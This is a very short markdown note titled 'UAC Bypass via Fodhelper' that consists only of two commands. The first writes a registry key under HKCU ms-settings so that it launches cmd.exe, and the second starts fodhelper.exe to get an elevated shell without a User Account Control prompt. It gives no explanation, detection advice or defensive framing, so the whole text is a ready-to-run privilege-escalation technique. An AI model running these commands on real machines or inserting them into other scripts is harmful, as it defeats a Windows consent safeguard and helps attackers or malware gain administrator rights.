# UAC Bypass via Fodhelper

```powershell
reg add HKCU\Software\Classes\ms-settings\shell\open\command /ve /t REG_SZ /d "cmd.exe" /f
start fodhelper.exe
```